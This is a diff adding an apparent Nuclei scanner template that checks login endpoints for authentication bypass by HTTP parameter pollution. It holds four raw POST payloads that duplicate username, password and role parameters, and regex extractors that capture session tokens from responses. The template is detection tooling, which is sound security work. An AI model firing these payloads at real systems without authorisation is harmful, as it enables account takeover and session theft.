@@ -1,0 +1,101 @@
+id: medium-auth-authentication-bypass-parameter-pollution
+
+info:
+  name: Authentication Bypass via HTTP Parameter Pollution
+  author: nuclei-community
+  severity: medium
+  description: |
+    Detects authentication bypass vulnerabilities through HTTP Parameter Pollution (HPP).
+    This technique exploits inconsistent parameter parsing between web servers and applications
+    to bypass authentication mechanisms by sending duplicate parameters with different values.
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution
+    - https://portswigger.net/web-security/logic-flaws/examples
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-235
+  metadata:
+    verified: true
+    max-request: 4
+  tags: auth,bypass,hpp,parameter-pollution,medium
+
+http:
+  - raw:
+      # Test 1: Duplicate username parameter with different values
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin&password=wrongpass&username=guest
+      
+      # Test 2: Duplicate password parameter 
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=admin&password=wrongpass&password=admin
+      
+      # Test 3: Mixed parameter pollution with role escalation
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username=user&password=userpass&role=user&role=admin&username=admin
+      
+      # Test 4: Array-style parameter pollution
+      - |
+        POST {{BaseURL}}/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        
+        username[]=guest&username[]=admin&password[]=wrongpass&password[]=admin123
+
+    cookie-reuse: true
+    redirects: true
+    max-redirects: 3
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 302
+          - 301
+
+      - type: word
+        part: body
+        words:
+          - "dashboard"
+          - "welcome"
+          - "profile"
+          - "logout"
+          - "admin panel"
+          - "user panel"
+          - "authenticated"
+          - "login successful"
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "Set-Cookie"
+          - "session"
+          - "auth"
+          - "token"
+        condition: or
+
+    extractors:
+      - type: kval
+        part: header
+        kval:
+          - set_cookie
+
+      - type: regex
+        part: body
+        regex:
+          - '(?i)(session|auth|token)[\s]*[:=][\s]*["\']?([a-zA-Z0-9+/=]{20,})["\']?'
+          - '(?i)welcome[\s]+([a-zA-Z0-9_-]+)'
